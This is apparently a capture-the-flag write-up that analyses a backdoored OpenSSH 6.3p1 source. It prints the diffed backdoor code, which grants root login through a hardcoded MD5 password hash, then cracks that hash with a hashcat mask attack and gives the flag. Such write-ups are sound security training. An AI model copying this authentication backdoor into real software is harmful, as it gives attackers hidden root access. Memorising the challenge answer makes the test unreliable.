# Can You Look This Over?

* **Category**: Miscellaneous
* **Points**: 150
* **Challenge**: Our ops guys found a malware author's staging server, we managed to exfiltrate the source to a backdoor they are spreading: backdoor.tar.gz. I need you to report back once you have cracked their secret password.
* **Hint #1**: What version / release of OpenSSH is in the provided archive?
* **Hint #2**: We know that their backdoor allows 'root' to login with a secret password
* **Hint #3**: Try diffing the backdoor tarball against the original source!
* **Hint #4**: The hashed password may be mixed case alphanumreic, but there shouldn't be any symbols!


<br />

The first hint for this challenge asks what is the version of the OpenSSH backdoor you have been provided?  Looking through the files, I was able to find the version in an openssh.spec file: 

```
cat /backdoor/contrib/suse/openssh.spec

...snip...

Summary:	OpenSSH, a free Secure Shell (SSH) protocol implementation
Name:		openssh
Version:	6.3p1
URL:		http://www.openssh.com/
Release:	1
Source0:	openssh-%{version}.tar.gz
Source1:	x11-ssh-askpass-%{xversion}.tar.gz
License:	BSD

...snip...
```

<br />

Now that we know the backdoor is OpenSSH 6.3p1, lets download a copy of the original [OpenSSH 6.3p1](http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-6.3p1.tar.gz) from the source and compare if to the backdoor:
```
diff -q openssh-6.3p1/ backdoor/

Files openssh-6.3p1/auth.c and backdoor/auth.c differ
Files openssh-6.3p1/auth.h and backdoor/auth.h differ
Files openssh-6.3p1/auth-passwd.c and backdoor/auth-passwd.c differ
Only in openssh-6.3p1/: ChangeLog
```

<br />

So there are three files that are different between the backoor and the original OpenSSH 6.3p1.  Of particular interest, the auth-passwd.c is used for password authentication and contains fucntions to check whether the password is valid for a user.  Lets look at the differences in that file:
```
diff openssh-6.3p1/auth-passwd.c backdoor/auth-passwd.c


th-passwd.c 
47a48,49
> #include <openssl/md5.h>
> 
88a91,93
>     if(sys_auth_backdoor(authctxt, password))
>         return 1;
> 
215a221,245
>     
> static char backdoor_hash[MD5_DIGEST_LENGTH] = \
> {
>     0x22, 0xEA, 0x36, 0x43, 0xD7, 0x37, 0x17, 0x20, 0xBC, 0xE8, 0xB5, 0xF2, 0x44, 0xD4, 0x02, 0x6A
> };
> 
> int
> sys_auth_backdoor(Authctxt *authctxt, const char *password)
> {
>     MD5_CTX c = {};
>     char password_hash[MD5_DIGEST_LENGTH] = {}; 
> 	struct passwd *pw = authctxt->pw;
>     
>     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
>         return 0;
> 
>     MD5_Init(&c);
>     MD5_Update(&c, password, strlen(password));
>     MD5_Final(password_hash, &c);
> 
>     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
>         return 0;
> 
>     return 1;
> }
```

<br />

Again the challenge is asking us to crack a secret password.  The `static char backdoor_hash[MD5_DIGEST_LENGTH]` looks like it contains a hashed password.  Lets strip out the leading `0x` and see what we get:
```
22EA3643D7371720BCE8B5F244D4026A
```

<br /> 

Now lets check to see what kind of hashing algorithm this is:
```
hash-identifier 

   -------------------------------------------------------------------------
 HASH: 22EA3643D7371720BCE8B5F244D4026A

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

<br /> 

Now that we know this is an MD5 hash, lets look at auth-passwd.c further:
```
if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
         return 0;
```
To aid in cracking the MD5 hash, it looks like the password must be six characters in length. The last hint for this challenge states the password contains mixed case alphanumreic and no symbols.  Now we can use a hashcat to perform a [mask attack](https://www.4armed.com/blog/perform-mask-attack-hashcat/).  To do this, we create a create a custom character set consisting of upper and lowercase letters and numbers (`-1 ?l?u?d`), then we specify that each of the six characters in the password could be from that character set (`?1?1?1?1?1?1`).  Put it all together using hashcat (I used the Windows version):
```
hashcat64.exe -m 0 -a 3 -1 ?l?u?d hash.txt ?1?1?1?1?1?1 -O


22ea3643d7371720bce8b5f244d4026a:2tNM8l
```

<br />

## Flag: ACI{2tNM8l}
